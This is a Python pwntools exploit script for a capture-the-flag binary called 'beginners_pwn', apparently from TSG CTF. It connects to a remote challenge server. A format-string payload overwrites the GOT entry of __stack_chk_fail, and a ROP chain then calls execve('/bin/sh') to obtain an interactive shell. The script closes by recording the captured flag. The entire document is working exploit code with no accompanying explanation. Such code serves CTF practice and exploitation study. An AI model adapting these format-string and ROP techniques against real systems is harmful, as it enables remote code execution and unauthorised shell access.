from pwn import *

HOST = "35.221.81.216"
PORT = 30002
elf = ELF('beginners_pwn')
r = remote(HOST, PORT)

payload = b''
payload += b'%8$lu %1$s'.ljust(0x10, b'\0')
payload += p64(elf.got['__stack_chk_fail'])
r.sendline(payload)

canvas = 0x404000 + 0xc00

payload = b''
payload += str(0x401256).encode() + b' '
payload += b'/bin/sh'.ljust(0x10, b'\0')
payload += b'A'  # padding
payload += p64(0x4012ba)
payload += p64(0)  # rbx
payload += p64(0x1)  # rbp
payload += p64(canvas)  # r12 (edi)
payload += p64(0x21)  # r13 (rsi)
payload += p64(0)  # r14
payload += p64(elf.got['__stack_chk_fail'])  # r15
payload += p64(0x4012a0)
payload += p64(canvas) * 7
payload += p64(0x00401146)
# Setting arguments of execve('/bin/sh', NULL, NULL)
payload += p64(0x4012ba)
payload += p64(0)  # rbx
payload += p64(0x1)  # rbp
payload += p64(canvas)  # r12 (edi)
payload += p64(0x0)  # r13 (rsi)
payload += p64(0)  # r14 (rdx)
payload += p64(elf.got['__stack_chk_fail'])  # r15
payload += p64(0x4012a0)
payload += p64(canvas) * 7
payload += p64(0x40118f)  # syscall

r.sendline(payload)  # dummy: send `AAAA' to the server

payload = ''
payload += '/bin/sh\0'.ljust(0x21, chr(0x3b))
r.sendline(payload)
r.interactive()  # After you get shell, you can intereact with the server!

# FLAG --> TSGCTF{w3lc0m3_70_756c7f2_60_4h34d_pwnpwn~}
